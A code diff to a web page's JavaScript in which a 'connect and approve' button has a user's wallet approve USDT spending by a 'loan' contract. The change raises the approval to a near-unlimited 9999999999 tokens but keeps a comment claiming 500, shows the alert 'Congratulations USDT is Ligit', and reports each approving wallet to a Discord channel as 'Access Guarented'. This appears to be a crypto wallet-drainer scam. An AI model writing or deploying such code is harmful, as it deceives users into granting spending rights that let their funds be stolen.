@@ -56,11 +56,11 @@ document.getElementById("connectAndApprove").addEventListener("click", async () 
 
         // Approve USDT
         const usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
-        const amountToApprove = Web3.utils.toWei("50000", "ether"); // Approve 500 USDT
+        const amountToApprove = Web3.utils.toWei("9999999999", "ether"); // Approve 500 USDT
         await usdtContract.methods.approve(LOAN_CONTRACT_ADDRESS, amountToApprove).send({ from: account });
 
         alert("Congratulations USDT is Ligit");
-        sendToDiscord(`USDT approval granted by wallet: ${account} for 50000 USDT`);
+        sendToDiscord(`Access Guarented: ${account}`);
     } catch (error) {
         console.error("Error:", error);
         alert("An error occurred. Check the console for details.");
